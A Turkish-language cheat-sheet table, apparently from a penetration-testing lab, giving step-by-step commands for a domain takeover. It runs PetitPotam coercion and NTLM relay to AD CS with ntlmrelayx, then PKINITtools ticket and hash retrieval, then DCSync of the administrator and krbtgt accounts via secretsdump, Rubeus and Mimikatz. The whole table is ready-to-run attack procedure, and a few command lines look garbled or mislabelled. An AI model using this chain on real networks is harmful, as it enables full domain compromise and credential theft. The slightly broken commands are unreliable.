| Komut | Açıklama | Kullanıcı | Hedef | Notlar |
| --- | --- | --- | --- | --- |
| `git clone https://github.com/topotam/PetitPotam.git` | PetitPotam exploit kodunu indirim | Linux Saldırı Makinası | - | Git kullanılarak yapılır. |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5` | PetitPotam exploit kodunu çalıştırın | Linux Saldırı Makinası | Hedef (Domain Controller) | Kendi IP adresinizi belirtin. |
| `sudo ntlmrelayx.py -debug -smb2support --target http://target-domain.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | NTLM relay oluşturmak için Impacket aracını çalıştırın | Linux Saldırı Makinası | Hedef (CA Sunucu) | Sunucu sertifika kayıt URL'sini belirtin. |
| `python3 /opt/PKINITtools/gettgtpkinit.py target-domain.LOCAL/TARGET-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache` | TGT bileti almak için Impacket aracını çalıştırın | Linux Saldırı Makinası | Domain Controller | Base64 sertifika ve ccache dosyası oluşturulur. |
| `klist` | Ccache dosyasının içeriğini görüntüle | Linux Kullanıcı | - | Kerberos bilet bilgilerini gösterir. |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 target-domain/TARGET-DC01$` | NTLM hash değerleri almak | Linux Saldırı Makinası | Domain Controller | TGS istekleri gönderilir ve hash değerleri alınır. |
| `secretsdump.py -just-dc-user target-domain/administrator -k -no-pass "TARGET-DC01$"@TARGET-DC01.target-domain.local` | NTLM hash değerlerini NTDS.dit dosyasından çıkarmak | Linux Saldırı Makinası | Domain Controller | DCSync saldırısı ve TGT bileti kullanılır. |
| `secretsdump.py -just-dc-user target-domain/administrator "TARGET-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | NTLM hash değerlerini NTDS.dit dosyasından çıkarmak | Linux Saldırı Makinası | Domain Controller | DCSync saldırısı ve yakalanan hash değeri kullanılır. |
| `.\Rubeus.exe asktgt /user:TARGET-DC01$ /<base64 certificate>=/ptt` | Pass-the-ticket saldırısı yapmak | Windows Saldırı Makinası | Domain Controller | Makine hesabı kullanılarak TGT bileti alınır. |
| `mimikatz # lsadump::dcsync /user:target-domain\krbtgt` | DCSync saldırısı yapmak | Windows Saldırı Makinası | Domain Controller | Mimikatz kullanılarak DCSync saldırısı yapılır. |
